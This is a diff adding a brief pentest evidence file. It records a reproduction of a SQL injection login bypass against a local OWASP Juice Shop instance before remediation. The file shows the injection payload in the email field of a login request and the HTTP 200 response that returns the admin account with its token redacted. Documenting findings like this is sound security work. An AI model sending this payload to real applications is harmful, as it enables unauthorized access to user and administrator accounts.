@@ -1,0 +1,18 @@
+BEFORE REMEDIATION - Phase 16 (WEB-VUL-001)
+Finding: WEB-VUL-001 (SQL injection authentication bypass)
+Application: http://127.0.0.1:3000
+Captured: 2026-10-04T15:42:55+05:30
+Instance: original OWASP Juice Shop v20.2.0, unmodified build (node build/app)
+Method: same safe reproduction as Phase 10 (EVID-REVERIFY-C1)
+
+--- CONTROL: invalid credentials (expect 401) ---
+HTTP 401
+Invalid email or password.
+
+--- TEST: SQLi payload in email field (POST /rest/user/login) ---
+Request body: {"email":"' OR 1=1--","password":"x"}
+HTTP 200
+Response (JWT redacted):
+{"authentication":{"token":"[REDACTED-JWT]","bid":1,"umail":"admin@juice-sh.op"}}
+
+Interpretation: HTTP 200 + authentication token for the admin record = vulnerable
